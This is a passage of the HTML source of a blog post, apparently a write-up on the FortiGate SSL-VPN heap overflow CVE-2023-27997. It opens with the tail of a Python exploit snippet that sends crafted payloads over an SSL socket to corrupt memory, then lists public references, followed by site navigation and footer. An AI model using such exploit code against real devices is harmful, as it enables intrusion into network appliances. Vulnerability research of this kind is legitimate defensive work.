class="line"></span><br><span class="line">    sock = create_ssl_socket(IP, PORT)</span><br><span class="line"></span><br><span class="line">    offset = <span class="number">0x10</span></span><br><span class="line">    value = <span class="number">0xaa</span></span><br><span class="line">    seed, _ = exp.get_seed_for_md5_byte(offset, value)</span><br><span class="line">    payload = exp.create_payload(exp.DISTANCE+offset, seed)</span><br><span class="line">    exp.send_payload(sock, payload)</span><br><span class="line">    payload = exp.create_payload(exp.DISTANCE+offset+<span class="number">1</span>, seed)</span><br><span class="line">    exp.send_payload(sock, payload)</span><br><span class="line">    sock.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a target="_blank" rel="noopener" href="https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html">https://bestwing.me/CVE-2023-27997-FortiGate-SSLVPN-Heap-Overflow.html</a></p>
<p><a target="_blank" rel="noopener" href="https://labs.watchtowr.com/xortigate-or-cve-2023-27997/">https://labs.watchtowr.com/xortigate-or-cve-2023-27997/</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.lexfo.fr/xortigate-cve-2023-27997.html">https://blog.lexfo.fr/xortigate-cve-2023-27997.html</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <p class="site-author-name" itemprop="name">fxc233</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">16</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">8</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">fxc233</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
